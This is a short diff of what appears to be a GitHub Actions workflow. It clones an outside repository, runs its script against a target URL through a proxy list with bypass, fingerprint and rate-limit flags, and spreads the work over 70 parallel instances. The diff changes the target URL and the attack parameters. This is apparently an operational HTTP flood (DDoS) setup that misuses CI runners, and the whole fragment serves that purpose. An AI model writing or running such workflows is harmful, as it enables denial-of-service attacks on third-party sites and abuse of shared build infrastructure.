@@ -44,7 +44,7 @@ jobs:
           git clone https://github.com/Ggeg111/curly-octo-doodle.git
           mv curly-octo-doodle/m.js op.js
           
-          node op.js https://c2.dstatbot.win/6mNiyfX2 700 90 4 proxy.txt --all-bypass --all-fingerprint --all-ratelimit
+          node op.js https://rapidis.gay/6901966783-a1614294-0445-4d9b-998c-789d1990dc9e 400 4 90 proxy.txt --all-bypass --all-fingerprint --all-full
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
